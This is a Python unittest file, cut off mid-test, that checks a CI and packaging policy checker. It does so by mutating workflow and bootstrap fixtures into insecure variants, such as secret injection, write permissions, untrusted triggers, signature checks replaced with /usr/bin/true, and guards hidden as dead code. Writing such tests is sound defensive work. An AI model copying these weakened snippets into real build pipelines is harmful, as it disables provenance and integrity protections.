from __future__ import annotations

import copy
import hashlib
import importlib.util
import textwrap
import unittest
from contextlib import ExitStack, contextmanager
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "tools" / "check_packaged_smoke_policy.py"
SPEC = importlib.util.spec_from_file_location("check_packaged_smoke_policy", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CHECKER)


def inputs() -> dict[str, object]:
    return CHECKER.load_inputs()


def changed(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    if old not in value:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value.replace(old, new, 1)


def changed_last(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    offset = value.rfind(old)
    if offset < 0:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value[:offset] + new + value[offset + len(old) :]


@contextmanager
def synchronized_workflow_summary(current: dict[str, object]):
    workflow = str(current["workflow"])
    run_digests = tuple(
        (f"mutated-run-{index}", hashlib.sha256(block.encode("utf-8")).hexdigest())
        for index, block in enumerate(CHECKER._run_blocks(workflow))
    )
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    reviewed["workflow"] = CHECKER._reviewed_input_digest(workflow)
    with mock.patch.object(
        CHECKER,
        "EXPECTED_WORKFLOW_SHA256",
        hashlib.sha256(workflow.encode("utf-8")).hexdigest(),
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_RUN_BLOCK_SHA256",
        run_digests,
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_REVIEWED_INPUT_SHA256",
        reviewed,
    ):
        yield


@contextmanager
def synchronized_formal_workflow_summary(current: dict[str, object]):
    workflow = str(current["formal_workflow"])
    expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
    expected_hashes["formal workflow"] = hashlib.sha256(
        workflow.encode("utf-8")
    ).hexdigest()
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    reviewed["formal_workflow"] = CHECKER._reviewed_input_digest(workflow)
    with mock.patch.object(
        CHECKER,
        "EXPECTED_FORMAL_BOUNDARY_SHA256",
        expected_hashes,
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_REVIEWED_INPUT_SHA256",
        reviewed,
    ):
        yield


@contextmanager
def synchronized_reviewed_input_summaries(
    current: dict[str, object],
    *keys: str,
):
    expected = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    for key in keys:
        expected[key] = CHECKER._reviewed_input_digest(current[key])
    with mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", expected):
        yield


@contextmanager
def synchronized_input_document_summaries(
    current: dict[str, object],
    *keys: str,
):
    legacy_constants = {
        "common_audit": "EXPECTED_COMMON_AUDIT_SHA256",
        "prepare": "EXPECTED_PREPARE_SHA256",
        "bundle_audit": "EXPECTED_BUNDLE_AUDIT_SHA256",
        "before_pack": "EXPECTED_BEFORE_PACK_SHA256",
        "after_pack": "EXPECTED_AFTER_PACK_SHA256",
    }
    formal_labels = {
        "formal_base_config": "formal base config",
        "formal_release_config": "formal release config",
        "formal_before_pack": "formal beforePack",
        "formal_after_pack": "formal afterPack",
        "formal_prepare_release": "formal prepareRelease",
        "formal_reseal": "formal runtime reseal",
        "formal_release_policy_tests": "formal release policy tests",
    }
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    formal = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
    with ExitStack() as stack:
        for key in keys:
            digest = CHECKER._reviewed_input_digest(current[key])
            reviewed[key] = digest
            if key in legacy_constants:
                stack.enter_context(
                    mock.patch.object(CHECKER, legacy_constants[key], digest)
                )
            label = formal_labels.get(key)
            if label is not None and label in formal:
                formal[label] = digest
        stack.enter_context(
            mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", reviewed)
        )
        stack.enter_context(
            mock.patch.object(CHECKER, "EXPECTED_FORMAL_BOUNDARY_SHA256", formal)
        )
        yield


def replace_make_target(
    current: dict[str, object],
    target: str,
    replacement: str,
) -> None:
    makefile = str(current["makefile"])
    start = makefile.index(f"{target}:")
    following = makefile.find("\n\n", start)
    if following < 0:
        raise AssertionError(f"Make target terminator missing: {target}")
    current["makefile"] = makefile[:start] + replacement + makefile[following:]


def wrap_python_statement_block(
    current: dict[str, object],
    start_marker: str,
    end_marker: str,
    wrapper: str,
) -> None:
    source = str(current["python_bootstrap"])
    marker_offset = source.index(start_marker)
    block_start = source.rfind("\n", 0, marker_offset) + 1
    end_offset = source.index(end_marker, marker_offset)
    block_end = source.rfind("\n", 0, end_offset) + 1
    indentation = source[block_start:marker_offset]
    block = source[block_start:block_end]
    current["python_bootstrap"] = (
        source[:block_start]
        + f"{indentation}{wrapper}\n"
        + textwrap.indent(block, "    ")
        + source[block_end:]
    )


class PackagedSmokePolicyTests(unittest.TestCase):
    def test_current_engineering_smoke_boundary_is_consistent(self) -> None:
        self.assertEqual(CHECKER.validate_policy(inputs()), [])

    def test_policy_input_universe_is_closed(self) -> None:
        current = inputs()
        self.assertEqual(
            set(current),
            {
                "workflow",
                "makefile",
                "build_script",
                "audit_script",
                "python_bootstrap",
                "exact_git_checker",
                "exact_git_checker_tests",
                "exact_node_installer",
                "python_packaging_tests",
                "gitignore",
                "remediation_evidence",
                "package",
                "desktop_package_lock",
                "web_package",
                "web_package_lock",
                "python_build_requirements_lock",
                "python_runtime_lock",
                "python_toolchain_lock",
                "pyinstaller_spec",
                "smoke_config",
                "common_audit",
                "prepare",
                "desktop_entrypoint_builder",
                "renderer_builder",
                "stage_renderer",
                "audit_renderer",
                "engineering_packaging_tests",
                "before_pack_tests",
                "renderer_packaging_tests",
                "before_pack",
                "after_pack",
                "bundle_audit",
                "schema",
                "renderer_schema",
                "python_sidecar_schema",
                "formal_base_config",
                "formal_release_config",
                "formal_before_pack",
                "formal_after_pack",
                "formal_prepare_release",
                "formal_reseal",
                "formal_release_policy_tests",
                "formal_workflow",
                "status",
                "todo",
                "trace",
                "iteration",
            },
        )
        del current["bundle_audit"]
        self.assertIn(
            "packaged-smoke policy input set drifted",
            CHECKER.validate_policy(current),
        )

        reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
        del reviewed["python_bootstrap"]
        with mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", reviewed):
            self.assertIn(
                "packaged-smoke policy input set drifted",
                CHECKER.validate_policy(inputs()),
            )

    def test_dispatch_tag_and_pull_request_target_triggers_fail(self) -> None:
        for trigger in ("  workflow_dispatch:\n", "  pull_request_target:\n", "    tags:\n"):
            with self.subTest(trigger=trigger.strip()):
                current = inputs()
                changed(current, "workflow", "concurrency:\n", trigger + "\nconcurrency:\n")
                self.assertTrue(
                    any("trigger" in error or "forbidden control" in error for error in CHECKER.validate_policy(current))
                )

    def test_duplicate_top_level_keys_and_step_skip_controls_fail(self) -> None:
        current = inputs()
        current["workflow"] = str(current["workflow"]) + "\njobs: {}\n"
        self.assertTrue(any("top-level key" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n        if: false",
        )
        self.assertTrue(any("repository guard" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(current, "workflow", "        shell: bash", "        shell: python")
        self.assertTrue(any("shell selection" in error for error in CHECKER.validate_policy(current)))

    def test_push_must_remain_main_only(self) -> None:
        current = inputs()
        changed(current, "workflow", "      - main\n", "      - '**'\n")
        self.assertIn(
            "workflow triggers must be exactly pull_request plus main push",
            CHECKER.validate_policy(current),
        )

    def test_permissions_environment_and_secrets_fail(self) -> None:
        mutations = (
            ("contents: read", "contents: write", "write permissions"),
            ("contents: read", "contents: read\n  issues: write", "permissions"),
            ("    runs-on: macos-15", "    environment: macos-signing\n    runs-on: macos-15", "Environment"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets.BAD }}\n      CI: \"true\"", "GitHub secrets"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets['BAD'] }}\n      CI: \"true\"", "GitHub secrets"),
        )
        for old, new, expected in mutations:
            with self.subTest(expected=expected):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertTrue(any(expected in error for error in CHECKER.validate_policy(current)))

    def test_actions_must_be_full_sha_pinned_and_allowlisted(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.CHECKOUT_SHA, "v6")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("action" in error for error in errors))

    def test_checkout_and_source_sha_cannot_fall_back_to_pr_merge(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            f"LCF_SOURCE_SHA: {CHECKER.SOURCE_EXPRESSION}",
            "LCF_SOURCE_SHA: ${{ github.sha }}",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_unified_provenance_checker_is_the_only_workflow_git_gate(self) -> None:
        mutations = (
            (
                '"${bootstrap_python}" -I tools/check_exact_git_provenance.py \\\n'
                '              --emit-github-env > "${provenance_env}"',
                "git rev-parse --verify HEAD",
            ),
            (
                '"${LCF_REVIEWED_BUILD_PYTHON}" -I \\\n'
                "            tools/check_exact_git_provenance.py > /dev/null",
                "true",
            ),
            (
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make packaged-smoke-policy-check',
                "        run: |\n"
                '          cd "${LCF_REVIEWED_SOURCE_ROOT}"\n'
                "          git status --porcelain=v1\n"
                "          make packaged-smoke-policy-check",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "git" in error.lower()
                        or "provenance" in error.lower()
                        or "critical step" in error.lower()
                        or "run-step" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

    def test_all_repo_owned_commands_run_from_the_private_exact_source(self) -> None:
        for key, old, new, expected in (
            (
                "workflow",
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make packaged-smoke-policy-check',
                "        run: make packaged-smoke-policy-check",
                "workflow repo-owned command escaped",
            ),
            (
                "workflow",
                "      - name: Build and stage audited renderer\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${LCF_REVIEWED_SOURCE_ROOT}"',
                "      - name: Build and stage audited renderer\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${RUNNER_TEMP}"',
                "workflow repo-owned command escaped",
            ),
            (
                "formal_workflow",
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
                "        run: make python-sidecar-build",
                "formal repo-owned command escaped",
            ),
        ):
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                context = (
                    synchronized_workflow_summary(current)
                    if key == "workflow"
                    else synchronized_formal_workflow_summary(current)
                )
                with context:
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_private_exact_source_bootstrap_is_semantic(self) -> None:
        for old, new in (
            (
                'readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"',
                'readonly canonical_repository_url="https://example.invalid/unreviewed.git"',
            ),
            (
                'chmod 0700 "${reviewed_source}"',
                'chmod 0755 "${reviewed_source}"',
            ),
            (
                "            /usr/bin/env -i \\\n",
                "            /usr/bin/env \\\n",
            ),
            (
                '"+${LCF_SOURCE_SHA}:${reviewed_source_ref}"',
                '"+${GITHUB_SHA}:${reviewed_source_ref}"',
            ),
            (
                'git_private checkout --quiet --detach "${reviewed_source_ref}"',
                'git checkout --quiet --detach "${reviewed_source_ref}"',
            ),
            (
                'test "$(wc -l < "${provenance_env}")" -eq 5',
                "true",
            ),
            (
                "printf 'LCF_REVIEWED_SOURCE_ROOT=%s\\n' \\\n",
                "printf 'UNREVIEWED_SOURCE_ROOT=%s\\n' \\\n",
            ),
        ):
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "private exact-source bootstrap" in error
                        or "GITHUB_ENV" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_build_script_tests_ignore_and_nogo_evidence_are_bound_inputs(self) -> None:
        current = inputs()
        current["build_script"] = str(current["build_script"]) + "\nGITHUB_SHA\n"
        with synchronized_reviewed_input_summaries(current, "build_script"):
            self.assertIn(
                "Python sidecar provenance must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "exact_git_checker",
            'commit = environment.get("LCF_SOURCE_SHA", "").lower()',
            'commit = environment.get("LCF_SOURCE_SHA", environment.get("GITHUB_SHA", "")).lower()',
        )
        with synchronized_reviewed_input_summaries(current, "exact_git_checker"):
            self.assertIn(
                "exact Git provenance checker must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["build_script"] = str(current["build_script"]).replace(
            '"core.attributesFile=/dev/null",',
            '"core.attributesFile=unreviewed",',
            1,
        )
        with synchronized_reviewed_input_summaries(current, "build_script"):
            self.assertIn(
                "Python sidecar Git provenance isolation missing 'core.attributesFile=/dev/null'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["python_packaging_tests"] = str(
            current["python_packaging_tests"]
        ).replace("LCF_SOURCE_TREE", "LCF_SOURCE_TR33")
        with synchronized_reviewed_input_summaries(
            current,
            "python_packaging_tests",
        ):
            self.assertTrue(
                any(
                    "provenance tests" in error
                    for error in CHECKER.validate_policy(current)
                )
            )

        current = inputs()
        changed(
            current,
            "gitignore",
            "desktop/generated/python-sidecar-build-*/",
            "desktop/generated/",
        )
        with synchronized_reviewed_input_summaries(current, "gitignore"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("scratch ignore" in error for error in errors), errors)

        current = inputs()
        changed(
            current,
            "remediation_evidence",
            "decision=NO-GO",
            "decision=GO",
        )
        with synchronized_reviewed_input_summaries(
            current,
            "remediation_evidence",
        ):
            self.assertTrue(
                any(
                    "remediation evidence" in error
                    for error in CHECKER.validate_policy(current)
                )
            )

        current = inputs()
        changed(current, "workflow", "persist-credentials: false", "persist-credentials: true")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_reviewed_builder_test_and_schema_inputs_cannot_be_dropped(self) -> None:
        for key in (
            "audit_script",
            "python_bootstrap",
            "python_build_requirements_lock",
            "python_runtime_lock",
            "python_toolchain_lock",
            "pyinstaller_spec",
            "exact_git_checker",
            "exact_git_checker_tests",
            "exact_node_installer",
            "desktop_package_lock",
            "desktop_entrypoint_builder",
            "renderer_builder",
            "stage_renderer",
            "audit_renderer",
            "engineering_packaging_tests",
            "before_pack_tests",
            "renderer_packaging_tests",
            "renderer_schema",
            "python_sidecar_schema",
            "formal_prepare_release",
            "formal_reseal",
            "formal_release_policy_tests",
        ):
            with self.subTest(key=key):
                current = inputs()
                del current[key]
                self.assertEqual(
                    CHECKER.validate_policy(current),
                    ["packaged-smoke policy input set drifted"],
                )

    def test_renderer_lock_uses_the_reviewed_blob_and_exact_fixed_env_keys(self) -> None:
        helper_mutations = (
            (
                "package_lock_bytes = sidecar._git_bytes(\n"
                '        "cat-file", "blob", package_lock_entry.object_id\n'
                "    )",
                'package_lock_bytes = Path("web/package-lock.json").read_bytes()',
                "exact Git provenance checker missing",
            ),
            (
                "selected_package_lock != renderer_package_lock_sha256",
                "False",
                "exact Git provenance checker missing",
            ),
            (
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                "",
                "fixed output key set",
            ),
            (
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                '        print("LCF_UNREVIEWED=1")\n'
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                "fixed output key set",
            ),
        )
        for old, new, expected in helper_mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "exact_git_checker", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "exact_git_checker",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

        current = inputs()
        lock = str(current["web_package_lock"]).replace(
            '"node_modules/vite": {\n      "version": "7.3.6"',
            '"node_modules/vite": {\n      "version": "0.0.0"',
            1,
        )
        if lock == current["web_package_lock"]:
            self.fail("web package lock fixture marker missing")
        current["web_package_lock"] = lock
        with synchronized_input_document_summaries(current, "web_package_lock"):
            errors = CHECKER.validate_policy(current)
        self.assertIn("reviewed renderer package lock contract drifted", errors)

    def test_exact_node_install_and_toolchain_values_are_semantic(self) -> None:
        mutations = (
            (
                "exact_node_installer",
                'const EXPECTED_NODE_VERSION = "v22.23.2";',
                'const EXPECTED_NODE_VERSION = "v23.0.0";',
            ),
            (
                "exact_node_installer",
                'const EXPECTED_NPM_VERSION = "10.9.8";',
                'const EXPECTED_NPM_VERSION = "11.17.0";',
            ),
            (
                "exact_node_installer",
                "!runtimeContract.allowExternalNpmForTest &&",
                "false &&",
            ),
            (
                "exact_node_installer",
                'const userConfig = path.join(temporaryHome, "user.npmrc");',
                "const userConfig = globalConfig;",
            ),
            (
                "exact_node_installer",
                "resolvedReal = fs.realpathSync.native(candidate);",
                "resolvedReal = path.resolve(candidate);",
            ),
            (
                "exact_node_installer",
                '} else if (record.type === "directory") {\n      content.mode = record.mode;',
                '} else if (record.type === "directory") {\n      delete content.mode;',
            ),
            (
                "engineering_packaging_tests",
                "rejects an npm executable outside the selected Node runtime before execution",
                "allows an external npm executable",
            ),
            (
                "engineering_packaging_tests",
                "fails the final install postcheck before an artifact can be accepted",
                "accepts an artifact before the final install postcheck",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("exact Node" in error for error in errors), errors)

        for key in ("common_audit", "prepare", "stage_renderer", "audit_renderer"):
            with self.subTest(consumer=key):
                current = inputs()
                changed(current, key, '"v22.23.2"', '"v23.0.0"')
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("exact Node toolchain value" in error for error in errors),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["components"]["properties"]["desktopApp"][
            "properties"
        ]["entrypointBuild"]["properties"]["nodeVersion"]["const"] = "v23.0.0"
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("manifest schema" in error for error in errors), errors)

        current = inputs()
        schema = copy.deepcopy(current["renderer_schema"])
        schema["properties"]["builder"]["properties"]["npmVersion"][
            "const"
        ] = "11.17.0"
        current["renderer_schema"] = schema
        with synchronized_input_document_summaries(current, "renderer_schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("renderer manifest schema" in error for error in errors),
            errors,
        )

    def test_python_exact_toolchain_bootstrap_and_evidence_are_semantic(self) -> None:
        mutations = (
            (
                "python_bootstrap",
                '"--require-hashes"',
                '"--no-deps"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "build._validate_repository_state(",
                "build._repository_tree_inventory(",
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"LCF_PYTHON_BUILD_VENV_FD"',
                '"LCF_PYTHON_BUILD_VENV_PATH"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "start_new_session=True",
                "start_new_session=False",
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "_make_installed_tree_cleanup_writable(descriptor)",
                "pass",
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"tools/build_python_sidecar.py"',
                '"tools/unreviewed_builder.py"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                'INSTALLER_ROOT_PREFIX = "lcf-python-installer."',
                'INSTALLER_ROOT_PREFIX = "unbounded-installer-"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"/usr/sbin/pkgutil"',
                '"/usr/bin/true"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"/usr/sbin/spctl"',
                '"/usr/bin/true"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"--non-interactive",\n                            "/usr/sbin/installer"',
                '"/usr/sbin/installer"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "build._exchange_at(",
                "os.replace(",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "if mode & 0o022:",
                "if False:",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "before.st_nlink != 1\n                    or before.st_size > MAX_TREE_FILE_BYTES",
                "False\n                    or before.st_size > MAX_TREE_FILE_BYTES",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "pass",
                "producer privatization",
            ),
            (
                "python_packaging_tests",
                "test_reviewed_python_installer_signal_cleans_exact_root",
                "removed_installer_signal_cleanup_fixture",
                "exact Python toolchain tests",
            ),
            (
                "python_packaging_tests",
                "test_installed_tree_privatization_exchange_failure_removes_private_copy",
                "removed_privatization_exchange_failure_fixture",
                "exact Python toolchain tests",
            ),
            (
                "python_packaging_tests",
                "test_exact_toolchain_build_failure_cleans_root",
                "removed_toolchain_failure_cleanup_fixture",
                "exact Python toolchain tests",
            ),
            (
                "build_script",
                "bootstrap.verify_toolchain_environment(environment)",
                "None",
                "Python inner builder toolchain evidence",
            ),
            (
                "audit_script",
                "def _validate_toolchain_evidence_artifact(",
                "def _ignore_toolchain_evidence_artifact(",
                "standalone Python auditor toolchain evidence",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

        current = inputs()
        schema = copy.deepcopy(current["python_sidecar_schema"])
        schema["$defs"]["pythonToolchain"]["required"].remove(
            "installedTreeContentSha256"
        )
        current["python_sidecar_schema"] = schema
        with synchronized_input_document_summaries(current, "python_sidecar_schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("Python sidecar manifest schema" in error for error in errors),
            errors,
        )

    def test_python_producer_privatization_ast_rejects_dead_code(self) -> None:
        mutations = (
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "(_privatize_installed_tree(bootstrap_root, bootstrap_fd, build) if False else None)",
            ),
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "if 1 == 0:\n"
                "                    _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            ),
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "for _unused in ():\n"
                "                    _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            ),
            (
                "        with build._defer_publish_signals():\n"
                "            build._exchange_at(",
                "        with build._defer_publish_signals():\n"
                "            if False:\n"
                "                build._exchange_at(",
            ),
            (
                "raise ToolchainBootstrapError(\n"
                '                                "Installed toolchain producer hardlink is writable"',
                "_ignored = ToolchainBootstrapError(\n"
                '                                "Installed toolchain producer hardlink is writable"',
            ),
            (
                "before.st_nlink != 1\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
                "(before.st_nlink != 1 and False)\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
                "if before.st_nlink != 1 and False:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            "return None\n"
            "                _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

    def test_python_outer_uv_capability_ast_rejects_weakened_cleanup(self) -> None:
        mutations = (
            (
                "preserve_error=runtime_error",
                "preserve_error=None",
            ),
            (
                "capability_error = capability_error or exc",
                "capability_error = exc",
            ),
            (
                "cwd_descriptor=backend_fd",
                "cwd_descriptor=source.descriptor",
            ),
            (
                ") from capability_error\n"
                "                if runtime_error is not None:",
                ") from runtime_error\n"
                "                if runtime_error is not None:",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

    def test_held_cwd_launcher_and_canonical_runner_mutations_are_rejected(
        self,
    ) -> None:
        launcher_mutations = (
            ("os.fchdir(cwd_fd)", 'os.chdir("/")'),
            ("signal.SIG_UNBLOCK", "signal.SIG_BLOCK"),
            (
                "os.execve(target, target_arguments, dict(os.environ))",
                "os.execv(target, target_arguments)",
            ),
            (
                "cwd_descriptor=source.descriptor",
                "cwd_descriptor=build_fd",
            ),
        )
        for old, new in launcher_mutations:
            with self.subTest(launcher=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "exact Python toolchain bootstrap" in error
                        or "exact Python held-cwd launcher" in error
                        for error in errors
                    ),
                    errors,
                )

        canonical_runner_mutations = (
            (
                "source_root = os.path.abspath(os.path.normpath(sys.argv.pop(1)))",
                'source_root = "/dev/fd/" + str(source_descriptor)',
            ),
            (
                "os.lstat(capability_root)",
                "os.stat(capability_root)",
            ),
            (
                "os.set_inheritable(capability_descriptor, False)",
                "os.set_inheritable(capability_descriptor, True)",
            ),
            (
                'os.environ["LCF_PYINSTALLER_SOURCE_ROOT"] = source_root',
                'os.environ["LCF_PYINSTALLER_SOURCE_ROOT"] = "/dev/fd/" + str(source_descriptor)',
            ),
        )
        for old, new in canonical_runner_mutations:
            with self.subTest(canonical_runner=old):
                current = inputs()
                changed(current, "build_script", old, new)
                with synchronized_input_document_summaries(current, "build_script"):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "PyInstaller canonical capability runner" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_strict_seal_ast_rejects_unreachable_guards(self) -> None:
        mutations = (
            (
                "if (\n                    before.st_nlink != 1\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
                "file_descriptor: int | None = None",
                "if 1 == 0:",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
                "child = os.open(",
                "if 1 == 0:",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain symlink is unsafe")',
                "target = os.readlink(",
                "for _unused in ():",
            ),
        )
        for start, end, wrapper in mutations:
            with self.subTest(start=start, wrapper=wrapper):
                current = inputs()
                wrap_python_statement_block(current, start, end, wrapper)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

    def test_python_privatization_ast_rejects_shadow_and_empty_inventory(self) -> None:
        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "                bootstrap_root, bootstrap_fd, _bootstrap_snapshot = _create_private_child(",
            "                _privatize_installed_tree = lambda *_args: None\n"
            "                bootstrap_root, bootstrap_fd, _bootstrap_snapshot = _create_private_child(",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

        names_assignment = (
            "names = tuple(sorted(os.listdir(directory_descriptor)))"
        )
        for replace_last in (False, True):
            with self.subTest(inventory=replace_last):
                current = inputs()
                mutation = (
                    "names = () if True else "
                    "tuple(sorted(os.listdir(directory_descriptor)))"
                )
                if replace_last:
                    changed_last(
                        current,
                        "python_bootstrap",
                        names_assignment,
                        mutation,
                    )
                else:
                    changed(
                        current,
                        "python_bootstrap",
                        names_assignment,
                        mutation,
                    )
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "names = tuple(sorted(os.listdir(descriptor)))",
            "names = () if True else tuple(sorted(os.listdir(descriptor)))",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
